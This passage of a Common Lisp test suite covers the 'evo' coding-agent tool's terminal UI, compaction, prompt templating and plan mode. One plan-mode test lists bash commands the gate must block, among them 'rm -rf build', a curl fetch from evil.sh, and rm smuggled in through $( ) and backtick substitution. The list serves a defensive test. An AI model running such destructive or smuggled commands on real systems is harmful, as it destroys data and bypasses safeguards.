      (check "select 3-element item passes value" (eql got 1)))))

(defun %expected-local-timestamp-prefix (timestamp)
  (multiple-value-bind (sec min hour day month year)
      (decode-universal-time
       (local-time:timestamp-to-universal
        (local-time:parse-timestring timestamp)))
    (declare (ignore sec))
    (format nil "~4,'0d-~2,'0d-~2,'0d ~2,'0d:~2,'0d"
            year month day hour min)))

(defun test-resume-picker ()
  (let* ((timestamp "2024-01-01T16:30:00Z")
         (expected (%expected-local-timestamp-prefix timestamp))
         (formatted (format-local-timestamp timestamp
                                            :timezone-name "Asia/Shanghai")))
    (check "local timestamp uses host local time"
           (search expected formatted))
    (check "local timestamp names timezone"
           (search "Asia/Shanghai" formatted)))
  (check "resume summary collapses whitespace"
         (equal (evo.tui::resume-summary-text (format nil "hello~%  world")
                                              :max-chars 20)
                "hello world"))
  (let ((short (evo.tui::resume-summary-text "1234567890abcdef"
                                             :max-chars 8)))
    (check "resume summary truncates to max length"
           (and (= (length short) 8)
                (char= (char short 7) #\…))))
  (let* ((dir (uiop:ensure-directory-pathname
               (format nil "~a/evo-resume-~a/" (uiop:getenv "TMPDIR") (gen-id))))
         (journal (progn (ensure-directories-exist dir)
                         (make-session-journal dir)))
         (prompt (format nil "first line~%second line ~a"
                         (make-string 200 :initial-element #\x))))
    (append-entry journal `(:type :message
                            :message (:role :user
                                      :content ((:type :text :text ,prompt)))))
    (append-entry journal '(:type :message
                            :message (:role :assistant :stop-reason :stop :model "m"
                                      :usage (:input 1 :output 1 :cache-read 0 :cache-write 0)
                                      :content ((:type :text :text "ok")))))
    (let* ((path (namestring (journal-path journal)))
           (timestamp "2024-01-01T16:30:00Z")
           (expected (%expected-local-timestamp-prefix timestamp))
           (session (list :path path :timestamp timestamp))
           (item (first (evo.tui::resume-select-items
                         (list session) :timezone-name "Asia/Shanghai")))
           (label (first item))
           (value (second item))
           (desc (third item)))
      (check "resume item is label value description"
             (= (length item) 3))
      (check "resume label shows local timestamp"
             (and (search expected label)
                  (search "Asia/Shanghai" label)))
      (check "resume item value is session path"
             (equal value path))
      (check "resume description uses leaf user prompt"
             (and (search "first line second line" desc)
                  (not (find #\Newline desc))))
      (check "resume description is bounded"
             (and (<= (length desc) evo.tui::*resume-summary-max-chars*)
                  (char= (char desc (1- (length desc))) #\…))))))

;;; Region draw anchoring: repaints must not climb into scrollback

(defun test-render-anchor ()
  (with-output-to-string (fake-tty)
    (let ((evo.tui::*tty-out* fake-tty)
          (evo.tui::*region-height* 0)
          (evo.tui::*region-cursor-row* 0))
      ;; Cursor parks on row 1 of 4 (editor row above rule + status line).
      (evo.tui::draw-region '("rule" "editor" "rule" "status") 1 2)
      (check "cursor row tracked" (= 1 evo.tui::*region-cursor-row*))
      (check "region height tracked" (= 4 evo.tui::*region-height*))
      ;; The next goto-region-start must move up exactly 1 row (the
      ;; cursor's region row), NOT region-height-1 = 3 — overshooting is
      ;; the bug that ate scrollback history on every repaint.
      (let ((out (with-output-to-string (probe)
                   (let ((evo.tui::*tty-out* probe))
                     (evo.tui::goto-region-start)))))
        (check "moves up cursor-row rows"
               (search (format nil "~c[1A" #\Escape) out))
        (check "does not overshoot to region top"
               (not (search (format nil "~c[3A" #\Escape) out))))
      ;; Scrollback emission resets both trackers.
      (evo.tui::emit-scrollback "hello")
      (check "scrollback resets height" (zerop evo.tui::*region-height*))
      (check "scrollback resets cursor row" (zerop evo.tui::*region-cursor-row*)))))

;;; Display width: wide characters must count their true columns, or a
;;; "truncated" region line still wraps the terminal and every repaint
;;; strands a copy of the streaming line in scrollback.

(defun test-display-width ()
  (check "ascii width 1" (= 1 (evo.tui::char-display-width #\a)))
  (check "cjk width 2" (= 2 (evo.tui::char-display-width #\中)))
  (check "fullwidth punct width 2" (= 2 (evo.tui::char-display-width #\，)))
  (check "emoji width 2" (= 2 (evo.tui::char-display-width #\🌟)))
  (check "combining width 0" (= 0 (evo.tui::char-display-width (code-char #x0301))))
  (check "tab width matches painter" (= 4 (evo.tui::char-display-width #\Tab)))
  (check "visible-length counts columns" (= 7 (evo.tui::visible-length "ab中文a")))
  (check "visible-length skips sgr" (= 2 (evo.tui::visible-length (evo.tui::dim "中"))))
  ;; Truncation in columns: ascii behavior unchanged, wide content cut early.
  (check "ascii under max unchanged"
         (equal "abcdef" (evo.tui::truncate-visible "abcdef" 10)))
  (check "ascii cut at max columns"
         (= 5 (evo.tui::visible-length (evo.tui::truncate-visible "abcdefghij" 5))))
  (let ((cut (evo.tui::truncate-visible (make-string 30 :initial-element #\中) 20)))
    (check "wide cut within max columns" (<= (evo.tui::visible-length cut) 20))
    (check "wide cut marked" (char= #\… (char cut (1- (length cut))))))
  ;; Region line sanitizing: tabs expand, control chars drop, SGR survives.
  (check "sanitize expands tab"
         (equal "a    b" (evo.tui::sanitize-line (format nil "a~cb" #\Tab))))
  (check "sanitize drops carriage return"
         (equal "ab" (evo.tui::sanitize-line (format nil "a~cb" #\Return))))
  (check "sanitize keeps sgr"
         (equal (evo.tui::dim "x") (evo.tui::sanitize-line (evo.tui::dim "x"))))
  ;; Editor wrap in columns; cursor position in columns.
  (let ((eb (evo.tui::make-edit-buffer)))
    (evo.tui::eb-insert-text eb "中中中")
    (multiple-value-bind (rows crow ccol) (evo.tui::eb-display-rows eb 4)
      (check "wide wrap rows" (equal rows '("中中" "中")))
      (check "wide wrap cursor in columns" (and (= crow 1) (= ccol 2)))))
  ;; End to end: a streaming wide line must never paint past the region
  ;; width — the painted chunk stays under *cols*, so it cannot wrap.
  (with-output-to-string (fake-tty)
    (let ((evo.tui::*tty-out* fake-tty)
          (evo.tui::*cols* 11)
          (evo.tui::*region-height* 0)
          (evo.tui::*region-cursor-row* 0))
      (evo.tui::draw-region (list (make-string 8 :initial-element #\中)) 0 0)
      (let ((out (get-output-stream-string fake-tty)))
        (check "wide region line truncated"
               (not (search "中中中中中" out)))))))

;;; Markdown rendering of agent output

(defun test-markdown ()
  (let ((esc-bold (format nil "~c[1m" #\Escape))
        (esc-italic (format nil "~c[3m" #\Escape))
        (esc-code (format nil "~c[33m" #\Escape))
        (esc-dim (format nil "~c[2m" #\Escape))
        (esc-underline (format nil "~c[4m" #\Escape)))
    (let ((md (evo.tui::make-md)))
      ;; headings: marks kept dim, text bold
      (let ((r (evo.tui::md-render-line "## Section" md)))
        (check "heading bold" (search esc-bold r))
        (check "heading marks dim" (search esc-dim r))
        (check "heading text kept" (search "Section" r)))
      (check "hashtag is not a heading"
             (equal "#tag" (evo.tui::md-render-line "#tag" md)))
      ;; inline styles
      (let ((r (evo.tui::md-render-line "a **b** *c* `d`" md)))
        (check "strong styled" (and (search esc-bold r) (not (search "**" r))))
        (check "emph styled" (and (search esc-italic r) (not (search "*c*" r))))
        (check "code span colored" (and (search esc-code r) (not (find #\` r)))))
      (check "unmatched marker literal"
             (equal "2 * 3 * 4" (evo.tui::md-render-line "2 * 3 * 4" md)))
      (check "snake_case untouched"
             (equal "eb_display_rows" (evo.tui::md-render-line "eb_display_rows" md)))
      (check "code span protects content"
             (search "**x**" (evo.tui::md-render-line "`**x**`" md)))
      ;; lists, quotes, rules
      (let ((r (evo.tui::md-render-line "- item" md)))
        (check "bullet glyph" (search "•" r))
        (check "bullet text" (search " item" r)))
      (check "ordered prefix colored"
             (search "1." (evo.tui::md-render-line "1. first" md)))
      (check "blockquote gutter"
             (search "▌" (evo.tui::md-render-line "> quoted" md)))
      (let ((evo.tui::*cols* 20))
        (check "hrule becomes a rule"
               (search "───" (evo.tui::md-render-line "---" md))))
      ;; links
      (let ((r (evo.tui::md-render-line "see [evo](https://x.dev)" md)))
        (check "link text underlined" (search esc-underline r))
        (check "link url kept" (search "https://x.dev" r)))
      ;; fenced code: fence dim, content verbatim, state toggles
      (let ((r (evo.tui::md-render-line "```lisp" md)))
        (check "fence dim" (search esc-dim r))
        (check "fence enters code" (evo.tui::md-in-code md)))
      (check "code content verbatim"
             (equal "(x **y**)" (evo.tui::md-render-line "(x **y**)" md)))
      ;; preview never advances the fence state
      (check "preview leaves state alone"
             (progn (evo.tui::md-render-preview "```" md)
                    (evo.tui::md-in-code md)))
      (evo.tui::md-render-line "```" md)
      (check "fence closes" (not (evo.tui::md-in-code md)))
      (let ((r (evo.tui::md-render-line "**b**" md)))
        (check "styling resumes after fence" (search esc-bold r))))
    ;; whole-text rendering starts from a fresh fence state
    (let ((r (evo.tui::md-render-text (format nil "# t~%```~%**raw**~%```"))))
      (check "text render styles heading" (search esc-bold r))
      (check "text render keeps code raw" (search "**raw**" r)))))

;;; User prompts sit between two rules in scrollback

(defun test-user-prompt-block ()
  (let* ((evo.tui::*cols* 30)
         (block (evo.tui::user-prompt-block "hello"))
         (lines (uiop:split-string block :separator '(#\Newline))))
    (check "prompt block is three lines" (= 3 (length lines)))
    (check "rule above" (search "─" (first lines)))
    (check "prompt line marked" (and (search "❯" (second lines))
                                     (search "hello" (second lines))))
    (check "rule below" (search "─" (third lines)))))

;;; Input history navigation

(defun test-input-history ()
  (let* ((tui (evo.tui::make-tui))
         (eb (evo.tui::tui-editor tui)))
    (evo.tui::history-remember tui "first message")
    (evo.tui::history-remember tui "second message")
    (evo.tui::history-remember tui "second message")   ; consecutive dup
    (check "history dedups consecutive" (= 2 (length (evo.tui::tui-history tui))))
    ;; Browse: up recalls, down returns to the stashed draft.
    (evo.tui::eb-insert-text eb "draft")
    (evo.tui::edit-up tui)
    (check "up recalls most recent" (equal (evo.tui::eb-text eb) "second message"))
    (evo.tui::edit-up tui)
    (check "up again goes older" (equal (evo.tui::eb-text eb) "first message"))
    (evo.tui::edit-up tui)
    (check "up stops at oldest" (equal (evo.tui::eb-text eb) "first message"))
    (evo.tui::edit-down tui)
    (check "down goes newer" (equal (evo.tui::eb-text eb) "second message"))
    (evo.tui::edit-down tui)
    (check "down restores draft" (equal (evo.tui::eb-text eb) "draft"))
    ;; Multi-line buffers: up/down move within lines first.
    (evo.tui::eb-set-text eb (format nil "line1~%line2"))
    (evo.tui::edit-up tui)
    (check "up inside multi-line moves lines" (= 0 (evo.tui::eb-line eb)))
    (check "no history recall mid-buffer" (equal (evo.tui::eb-text eb)
                                                 (format nil "line1~%line2")))
    (evo.tui::edit-up tui)
    (check "up from first line recalls history"
           (equal (evo.tui::eb-text eb) "second message"))
    ;; /commands never enter history, so recall can't re-open the popup.
    (evo.tui::history-remember tui "/todo")
    (check "slash command not recorded"
           (= 2 (length (evo.tui::tui-history tui))))
    (evo.tui::history-remember tui "//not a command")
    (check "escaped slash text recorded"
           (equal "//not a command" (first (evo.tui::tui-history tui))))))

;;; Plan/auto mode switching (shift+tab, /mode, status indicator)

(defun test-mode-switching ()
  (let* ((dir (uiop:ensure-directory-pathname
               (format nil "~a/evo-mode-~a/" (uiop:getenv "TMPDIR") (gen-id))))
         (journal (progn (ensure-directories-exist dir) (make-session-journal dir)))
         (agent (make-agent :journal journal))
         (tui (evo.tui::make-tui :agent agent)))
    (with-output-to-string (fake-tty)
      (let ((evo.tui::*tty-out* fake-tty)
            (evo.tui::*region-height* 0)
            (evo.tui::*region-cursor-row* 0))
        (check "mode starts auto" (equal (evo.tui::current-mode tui) "auto"))
        (check "auto indicator in status line"
               (search "◆ auto" (evo.tui::status-line tui)))
        ;; shift+tab toggles into plan mode
        (evo.tui::handle-key-edit tui :shift-tab)
        (check "shift-tab switches to plan"
               (equal (evo.tui::current-mode tui) "plan"))
        (let ((line (evo.tui::status-line tui)))
          (check "plan indicator leads status line"
                 (and (search "◇ plan" line)
                      (< (search "◇ plan" line) (search "ctx" line)))))
        (let ((state (fold-state journal)))
          (check "mode journaled as custom state"
                 (equal (evo.journal:custom-state state "mode") "plan"))
          (check "plan mode gates the tool set"
                 (equal (evo.journal:state-tools state) evo.plan:*plan-tools*))
          (check "plan instructions injected"
                 (find-if (lambda (m)
                            (equal (pget (pget m :meta) :key) "plan-mode"))
                          (evo.journal:state-messages state))))
        ;; shift+tab toggles back; full tool set restored
        (evo.tui::handle-key-edit tui :shift-tab)
        (check "shift-tab back to auto"
               (equal (evo.tui::current-mode tui) "auto"))
        (check "auto restores full tool set"
               (equal (evo.journal:state-tools (fold-state journal))
                      (evo.kernel:all-tool-names)))
        ;; /mode with no args opens the choose box, preselecting current
        (evo.tui::mode-command tui "")
        (check "mode choose box opens" (eq (evo.tui::tui-mode tui) :select))
        (check "mode box has two entries"
               (= 2 (length (evo.tui::tui-select-items tui))))
        (check "mode box preselects current"
               (= 0 (evo.tui::tui-select-index tui)))
        (evo.tui::handle-key-select tui :down)
        (evo.tui::handle-key-select tui :enter)
        (check "mode box selection switches"
               (equal (evo.tui::current-mode tui) "plan"))
        ;; /mode with an explicit arg
        (evo.tui::mode-command tui "auto")
        (check "mode arg switches" (equal (evo.tui::current-mode tui) "auto"))
        ;; Even stale userspace extensions that registered the old commands must
        ;; not resurrect them in completion or dispatch.
        (let ((called nil))
          (setf (gethash "plan" evo::*commands*)
                (list :fn (lambda (ctx)
                            (declare (ignore ctx))
                            (setf called "plan")
                            "old /plan")
                      :description "old plan command")
                (gethash "auto" evo::*commands*)
                (list :fn (lambda (ctx)
                            (declare (ignore ctx))
                            (setf called "auto")
                            "old /auto")
                      :description "old auto command"))
          (unwind-protect
               (progn
                 ;; completion candidates include /mode, but plan/auto remain mode
                 ;; arguments only — not standalone slash commands.
                 (let ((commands (evo.tui::all-commands)))
                   (check "mode is a completion candidate"
                          (assoc "mode" commands :test #'string=))
                   (check "exit is a completion candidate"
                          (assoc "exit" commands :test #'string=))
                   (check "plan is not a completion candidate"
                          (not (assoc "plan" commands :test #'string=)))
                   (check "auto is not a completion candidate"
                          (not (assoc "auto" commands :test #'string=))))
                 (check "plan is not a builtin command"
                        (not (evo.tui::builtin-command tui "plan" "")))
                 (check "auto is not a builtin command"
                        (not (evo.tui::builtin-command tui "auto" "")))
                 (evo.tui::dispatch-command tui (format nil "/~a" "plan"))
                 (check "slash plan does not switch mode"
                        (equal (evo.tui::current-mode tui) "auto"))
                 (check "slash plan extension not called" (null called))
                 (evo.tui::set-mode tui "plan")
                 (evo.tui::dispatch-command tui (format nil "/~a" "auto"))
                 (check "slash auto does not switch mode"
                        (equal (evo.tui::current-mode tui) "plan"))
                 (check "slash auto extension not called" (null called)))
            (remhash "plan" evo::*commands*)
            (remhash "auto" evo::*commands*)))))))

;;; Goal budgets (default: no limit)

(defun test-goal-budget ()
  (let* ((dir (uiop:ensure-directory-pathname
               (format nil "~a/evo-goal-~a/" (uiop:getenv "TMPDIR") (gen-id))))
         (journal (progn (ensure-directories-exist dir) (make-session-journal dir)))
         (agent (make-agent :journal journal)))
    (create-goal-entry agent "do the thing")
    (let ((goal (current-goal agent)))
      (check "default budget is nil" (null (pget goal :token-budget)))
      (check "continuation says no limit"
             (search "no limit" (goal-continuation-message goal 1234)))
      (check "continuation with budget shows remaining"
             (search "(800 remaining)"
                     (goal-continuation-message (pput goal :token-budget 2034) 1234))))))

;;; Templates + skills

(defun test-templates ()
  (check "template $1 $@"
         (equal (expand-template "fix $1 in $2 ($@)" "a b")
                "fix a in b (a b)"))
  (check "template missing args" (equal (expand-template "$1-$3" "x") "x-"))
  (let ((front (evo.kernel::parse-frontmatter
                (format nil "---~%name: demo~%description: a demo skill~%---~%body"))))
    (check "frontmatter parse"
           (and (equal (cdr (assoc "name" front :test #'equal)) "demo")
                (equal (cdr (assoc "description" front :test #'equal)) "a demo skill"))))
  (let* ((old-home (uiop:getenv "HOME"))
         (home (uiop:ensure-directory-pathname
                (format nil "~a/evo-agents-home-~a/" (uiop:getenv "TMPDIR") (gen-id))))
         (cwd (uiop:ensure-directory-pathname
               (format nil "~a/evo-agents-project-~a/" (uiop:getenv "TMPDIR") (gen-id))))
         (shadow (format nil "shadow-~a" (gen-id)))
         (global-agents-only (format nil "global-agents-~a" (gen-id)))
         (project-agents-only (format nil "project-agents-~a" (gen-id))))
    (flet ((write-skill (path name description)
             (write-file-string
              path
              (format nil "---~%name: ~a~%description: ~a~%---~%body" name description))))
      (unwind-protect
           (progn
             (evo.port:setenv "HOME" (namestring home))
             (write-skill (merge-pathnames (format nil ".agents/skills/~a/SKILL.md" shadow) home)
                          shadow "global agents")
             (write-skill (merge-pathnames (format nil "skills/~a/SKILL.md" shadow) (evo-home))
                          shadow "global evo")
             (write-skill (merge-pathnames (format nil ".agents/skills/~a/SKILL.md" shadow) cwd)
                          shadow "project agents")
             (write-skill (merge-pathnames (format nil ".evo/skills/~a/SKILL.md" shadow) cwd)
                          shadow "project evo")
             (write-skill (merge-pathnames (format nil ".agents/skills/~a/SKILL.md" global-agents-only) home)
                          global-agents-only "global agents only")
             (write-skill (merge-pathnames (format nil ".agents/skills/~a/SKILL.md" project-agents-only) cwd)
                          project-agents-only "project agents only")
             (let ((skills (available-skills cwd)))
               (check "global .agents skills are scanned"
                      (find global-agents-only skills :key (lambda (s) (pget s :name)) :test #'equal))
               (check "project .agents skills are scanned"
                      (find project-agents-only skills :key (lambda (s) (pget s :name)) :test #'equal))
               (check ".evo shadows .agents and project shadows global"
                      (equal (pget (find shadow skills :key (lambda (s) (pget s :name)) :test #'equal)
                                   :description)
                             "project evo"))))
        (when old-home (evo.port:setenv "HOME" old-home))))))

;;; Compaction

(defun test-compaction ()
  ;; select-cut never starts the tail at a tool result.
  (let* ((mk-user '(:role :user :content ((:type :text :text "u"))))
         (mk-asst '(:role :assistant :stop-reason :tool-use :model "m"
                    :usage (:input 1 :output 1 :cache-read 0 :cache-write 0)
                    :content ((:type :tool-call :id "t1" :name "bash"
                               :arguments (:command "ls")))))
         (mk-result '(:role :tool-result :tool-call-id "t1" :tool-name "bash"
                      :is-error nil :content ((:type :text :text "out"))))
         (messages (list mk-user mk-asst mk-result mk-user mk-asst mk-result)))
    (let ((evo.kernel::*compact-keep-recent-tokens* 2))
      (let ((cut (select-cut messages)))
        (check "cut not at tool result"
               (not (eq (evo.provider:message-role (nth cut messages)) :tool-result))))))
  ;; :compaction fold: summary + retained tail + entries after.
  (let* ((dir (uiop:ensure-directory-pathname
               (format nil "~a/evo-test-~a/" (uiop:getenv "TMPDIR") (gen-id))))
         (journal (progn (ensure-directories-exist dir) (make-session-journal dir))))
    (append-entry journal '(:type :message :message (:role :user :content ((:type :text :text "old")))))
    (append-entry journal
                  '(:type :compaction :summary "the summary"
                    :retained-tail #((:role :user :content ((:type :text :text "tail-msg"))))
                    :files-read #("a.txt") :files-modified #() :dropped-messages 1))
    (append-entry journal '(:type :message :message (:role :user :content ((:type :text :text "after")))))
    (let ((messages (evo.journal:state-messages (fold-state journal))))
      (check "compaction fold count" (= 3 (length messages)))
      (check "compaction summary first"
             (search "the summary"
                     (evo.util:pget (first (evo.provider:message-content (first messages))) :text)))
      (check "compaction retains tail"
             (equal "tail-msg"
                    (evo.util:pget (first (evo.provider:message-content (second messages))) :text)))
      (check "compaction keeps later entries"
             (equal "after"
                    (evo.util:pget (first (evo.provider:message-content (third messages))) :text)))))
  ;; Overflow classification.
  (check "overflow detected"
         (overflow-error-p '(:role :assistant :stop-reason :error
                             :error-message "HTTP 400: prompt is too long: 250000 tokens")))
  (check "overflow not confused with 500"
         (not (overflow-error-p '(:role :assistant :stop-reason :error
                                  :error-message "HTTP 500: boom")))))

;;; Lore

(defun test-lore ()
  (let* ((home (uiop:ensure-directory-pathname
                (format nil "~a/evo-lore-~a/" (uiop:getenv "TMPDIR") (gen-id)))))
    (evo.port:setenv "EVO_HOME" (namestring home))
    (unwind-protect
         (progn
           (add-lore "always run tests" :scope :global)
           (add-lore "prefer rg over grep" :scope :global)
           ;; :cwd is the scratch home, not the repo — a real .evo/lore.sexp
           ;; in the working tree must not leak into project scope here.
           (let ((lore (all-lore :cwd home)))
             (check "lore round trip"
                    (equal lore '("always run tests" "prefer rg over grep"))))
           (let ((prompt (build-system-prompt nil :lore (all-lore :cwd home))))
             (check "lore injected into prompt"
                    (search "prefer rg over grep" prompt))))
      (evo.port:setenv "EVO_HOME"
                       (namestring (uiop:ensure-directory-pathname
                                    (format nil "~a/evo-unit-home" (or (uiop:getenv "TMPDIR") "/tmp"))))))))

;;; System prompt templating: {{PLACEHOLDER}} tokens are where facts about
;;; the running environment get injected — and the boundary of what evo will
;;; expand is the boundary of what evo wrote.

(defun test-prompt-template ()
  (let ((bindings '(("A" . "alpha") ("B" . "beta"))))
    (check "render substitutes every occurrence"
           (equal (evo.kernel::render-template "{{A}} and {{A}} then {{B}}" bindings)
                  "alpha and alpha then beta"))
    (check "render leaves an unbound placeholder standing"
           (equal (evo.kernel::render-template "{{A}}/{{NOPE}}" bindings)
                  "alpha/{{NOPE}}")))
  (let ((dir (uiop:ensure-directory-pathname
              (format nil "~a/evo-prompt-~a/" (uiop:getenv "TMPDIR") (gen-id)))))
    (ensure-directories-exist dir)
    (write-file-string (merge-pathnames "CLAUDE.md" dir)
                       "keep {{WORKING_DIRECTORY}} literal")
    (let* ((prompt (build-system-prompt nil :cwd dir :model "some-model-id"))
           (env (subseq prompt (search "## Environment" prompt))))
      (check "environment reports the working directory"
             (search (namestring dir) env))
      (check "environment reports today's date"
             (search (evo.kernel::today-string) env))
      (check "environment reports the model in play"
             (search "some-model-id" env))
      (check "environment leaves no placeholder unresolved"
             (not (search "{{" env)))
      (check "user context files are injected, not expanded"
             (search "keep {{WORKING_DIRECTORY}} literal" prompt))
      (check "model falls back rather than leaving a hole"
             (search "unknown" (build-system-prompt nil :cwd dir)))
      (check "language section is absent until configured"
             (not (search "## Language" prompt)))
      (check "gitStatus is omitted outside a repository"
             (not (search "## gitStatus" prompt))))
    (let ((previous (setting :language)))
      (unwind-protect
           (progn
             (setf (setting :language) "Korean")
             (check "language section appears once configured"
                    (search "Always respond in Korean"
                            (build-system-prompt nil :cwd dir))))
        (setf (setting :language) previous)))))

;;; Tool-call event contract: the kernel announces the call — parsed
;;; arguments included — BEFORE executing it, then reports the result.

(defun test-tool-call-events ()
  (let* ((dir (uiop:ensure-directory-pathname
               (format nil "~a/evo-toolev-~a/" (uiop:getenv "TMPDIR") (gen-id))))
         (journal (progn (ensure-directories-exist dir) (make-session-journal dir)))
         (events nil)
         (agent (make-agent :journal journal
                            :events-cb (lambda (ev) (push ev events)))))
    (evo.kernel::run-tool-call agent '(:name "no-such-tool" :id "call_x"
                                       :arguments (:command "ls -la")))
    (let ((events (nreverse events)))
      (check "tool-call-start emitted before tool-result"
             (and (eq (pget (first events) :type) :tool-call-start)
                  (eq (pget (second events) :type) :tool-result)))
      (check "tool-call-start carries parsed arguments"
             (equal (pget (pget (first events) :arguments) :command) "ls -la"))
      (check "unknown tool reports an error result"
             (pget (second events) :is-error)))))

;;; Tool-call display: one line, key arguments only, and total — malformed
;;; arguments must degrade, never signal (this renders in the tick loop).

(defun test-tool-call-display ()
  (check "known tool shows its key arg"
         (equal (evo.tui::format-tool-call-plain "bash" '(:command "ls -la"))
                "⏺ bash(command=\"ls -la\")"))
  (check "schema underscores match hyphenated keywords"
         (equal (evo.tui::format-tool-call-plain
                 "edit" '(:path "f.lisp" :old-string "a" :new-string "b"))
                "⏺ edit(path=\"f.lisp\", old_string=\"a\")"))
  (check "unknown tool shows every arg"
         (equal (evo.tui::format-tool-call-plain "mystery" '(:foo-bar "x"))
                "⏺ mystery(foo_bar=\"x\")"))
  (check "no arguments degrades to bare name"
         (equal (evo.tui::format-tool-call-plain "bash" nil) "⏺ bash"))
  (check "long call truncated with marker"
         (let ((line (evo.tui::format-tool-call-plain
                      "bash" (list :command (make-string 200 :initial-element #\x)))))
           (and (<= (length line) (+ evo.tui::*tool-call-max-width* 1))
                (char= (char line (1- (length line))) #\…))))
  (check "newlines flattened to one line"
         (not (find #\Newline (evo.tui::format-tool-call-plain
                               "bash" (list :command (format nil "a~%b"))))))
  (check "non-list arguments degrade to bare name"
         (equal (evo.tui::format-tool-call-plain "bash" "not-a-plist") "⏺ bash"))
  (check "dotted plist degrades instead of signaling"
         (stringp (evo.tui::format-tool-call-plain "mystery" '(:a . "b")))))

;;; Plan mode, the core extension: mode policy and the two enforcement
;;; hooks.  Everything here goes through the registered hooks rather than
;;; calling the gates directly — with plan mode in the image, "are the hooks
;;; actually installed?" is itself part of what needs proving.

(defun tool-call-blocked-p (name args)
  "Run the real :tool-call hook chain.  Returns (values blocked-p reason)."
  (multiple-value-bind (args blocked-p reason)
      (evo.kernel::intercept-tool-call name args)
    (declare (ignore args))
    (values (and blocked-p t) reason)))

(defun run-transform-hooks (messages)
  "Project MESSAGES through the registered :transform-context hooks."
  (dolist (hook (gethash :transform-context evo.kernel::*event-hooks*) messages)
    (setf messages (funcall hook messages))))

(defun test-plan-mode ()
  (let* ((dir (uiop:ensure-directory-pathname
               (format nil "~a/evo-plan-~a/" (uiop:getenv "TMPDIR") (gen-id))))
         (journal (progn (ensure-directories-exist dir) (make-session-journal dir)))
         (agent (make-agent :journal journal))
         (evo:*agent* agent))
    ;; Default: auto — nothing gated, nothing filtered.
    (check "sessions start in auto" (equal "auto" (evo.plan:current-mode agent)))
    (check "auto is not plan mode" (not (evo.plan:plan-mode-p agent)))
    (check "auto allows write"
           (not (tool-call-blocked-p "write" '(:path "x" :content "y"))))
    ;; Switching applies the whole policy through the public API.
    (check "set-mode reports the switch" (equal "plan" (evo.plan:set-mode "plan" agent)))
    (check "switching to the current mode is a no-op"
           (null (evo.plan:set-mode "plan" agent)))
    (check "mode names normalize" (equal "plan" (evo.plan:mode-name "PLAN")))
    (check "non-modes are not mode names" (null (evo.plan:mode-name "help")))
    (check-signals "unknown mode signals" (evo.plan:set-mode "yolo" agent))
    (let ((state (fold-state journal)))
      (check "mode is journal state, not a flag"
             (equal "plan" (evo.journal:custom-state state "mode")))
      (check "plan gates the tool set"
             (equal (state-tools state) evo.plan:*plan-tools*))
      (check "plan instructions injected under a filterable key"
             (find-if (lambda (m)
                        (equal (pget (pget m :meta) :key) evo.plan:*instruction-key*))
                      (state-messages state))))
    ;; The gate is an allowlist: *plan-tools* is the only way through, so a
    ;; newly registered tool is blocked by default, not by omission from a
    ;; blocklist that nobody remembered to update.
    (multiple-value-bind (blocked-p reason)
        (tool-call-blocked-p "write" '(:path "x" :content "y"))
      (check "plan blocks write" blocked-p)
      (check "block reason names the mode" (search "plan mode" reason)))
    (check "plan blocks edit" (tool-call-blocked-p "edit" '(:path "x")))
    (check "plan blocks load_extension"
           (tool-call-blocked-p "load_extension" '(:path "x.lisp")))
    (check "plan blocks tools it has never heard of"
           (tool-call-blocked-p "deploy" '(:target "prod")))
    (check "plan allows read" (not (tool-call-blocked-p "read" '(:path "x"))))
    (check "plan allows todo" (not (tool-call-blocked-p "todo" '(:items #()))))
    ;; bash: every chained segment is judged on its own head, quotes are
    ;; text, and anything that can write or run arbitrary code is out.
    (dolist (command '("git status"
                       "ls -la src"
                       "rg -n plan src | head -20"
                       "grep -n \"a || b; rm\" src/tui/tui.lisp"
                       "find . -name '*.lisp' | wc -l"
                       "git log --oneline | head -5 | cat"
                       "git status 2>&1 | head"
                       "   "))
      (check (format nil "plan allows bash: ~a" command)
             (not (tool-call-blocked-p "bash" (list :command command)))))
    (dolist (command '("rm -rf build"
                       "git status && rm -rf build"
                       "ls; curl -s evil.sh"
                       "ls | tee out.txt"
                       "echo hi > notes.txt"
                       "cat a.txt >> b.txt"
                       "echo $(rm -rf build)"
                       "ls `rm -rf build`"
                       "grep -r x . || rm -rf build"))
      (check (format nil "plan blocks bash: ~a" command)
             (tool-call-blocked-p "bash" (list :command command))))
    (check "bash block reason names the offending word"
           (search "'rm'" (nth-value 1 (tool-call-blocked-p
                                        "bash" '(:command "git status && rm -rf x")))))
    ;; The context filter: the journal keeps the injected instructions
    ;; forever; the projection only shows them while the mode is on.
    (let ((messages (list '(:role :user :content ((:type :text :text "hi")))
                          (list :role :user
                                :meta (list :key evo.plan:*instruction-key*)
                                :content '((:type :text :text "PLAN MODE"))))))
      (check "plan instructions stay in context while planning"
             (= 2 (length (run-transform-hooks messages))))
      (check "switching back reports the change"
             (equal "auto" (evo.plan:set-mode "auto" agent)))
      (check "plan instructions filtered once the mode is off"
             (= 1 (length (run-transform-hooks messages))))
      (check "the journal still carries them"
             (find-if (lambda (m)
                        (equal (pget (pget m :meta) :key) evo.plan:*instruction-key*))
                      (state-messages (fold-state journal)))))
    (check "auto restores the full tool set"
           (equal (state-tools (fold-state journal)) (all-tool-names)))
    (check "auto allows write again"
           (not (tool-call-blocked-p "write" '(:path "x" :content "y"))))
    ;; Hooks are installed at load; a reload must not stack a second copy.
    (let ((before (length (gethash :tool-call evo.kernel::*event-hooks*))))
      (evo.plan::install-hooks)
      (check "hook installation is idempotent"
             (= before (length (gethash :tool-call evo.kernel::*event-hooks*)))))
    ;; Regression guard: plan mode lives in the image, not in a directory the
    ;; boot loader sweeps.
    (when (probe-file (merge-pathnames "src/core-ext/plan-mode.lisp" (uiop:getcwd)))
      (check "plan mode is not also shipped as a userspace extension"
             (not (probe-file (merge-pathnames "extensions/plan-mode.lisp"
                                               (uiop:getcwd))))))))

;;; Model/provider registries + provider-API protocol

(defun test-registry ()
  (reset-user-registries)
  (register-model* "reg-a" :provider :anthropic :api :anthropic-messages
                   :context-window 1000 :max-output 100)
  (register-model* "reg-b" :provider :openai :api :openai-responses
                   :context-window 2000 :max-output 200)
  (check "registration order preserved"
         (equal '("reg-a" "reg-b")
                (mapcar (lambda (m) (pget m :id)) (all-models))))
  (register-model* "reg-a" :provider :anthropic :api :anthropic-messages
                   :context-window 5000 :max-output 100)
  (check "re-register replaces in place"
         (and (= 2 (length (all-models)))
              (equal "reg-a" (pget (first (all-models)) :id))
              (= 5000 (pget (find-model "reg-a") :context-window))))
  (check "find-model passes plists through"
         (equal "x" (pget (find-model '(:id "x")) :id)))
